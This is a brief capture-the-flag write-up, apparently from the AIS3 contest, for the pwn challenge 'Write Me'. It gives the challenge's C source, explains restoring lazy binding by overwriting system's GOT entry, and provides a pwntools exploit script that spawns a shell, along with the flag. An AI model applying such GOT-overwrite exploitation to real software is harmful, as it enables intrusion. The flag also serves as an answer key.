# PWN - Write Me
## 程式碼
佛心題目有給原始碼
```
#include <stdlib.h>
#include <stdio.h>
int main()
{
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
    void *systemgot = 0x404028;
    void *scanfgot = 0x404040;
    //void *systemgot = (void *)((long long)(*(int *)(systemptr+2))+(long long)(systemptr+6));
    *(long long *)systemgot = (long long)0x0;

    printf("Address: ");
    void *addr;
    long long v;
    scanf("%ld",&addr);
    printf("Value: ");
    scanf("%ld",&v);
    *(long long *)addr = (long long)v;
    *(long long *)scanfgot = (long long)0x0;
    printf("OK! Shell for you :)\n");
    system("/bin/sh");
    return 0;
}
```

## 觀察
這題把 system 的 got 改成 0 了，但是第一次呼叫會有 lazy binding，所以就把 systemgot 改為原本 lazy binding 跳去的位址就好

## exploit
```
from pwn import *

r = remote('quiz.ais3.org', 10102)
r.recvuntil(': ')
r.sendline(str(0x404028))
r.recvuntil(': ')
r.sendline(str(0x401050))

r.interactive()
```

* flag: `AIS3{Y0u_know_h0w_1@2y_b1nd1ng_w@rking}`
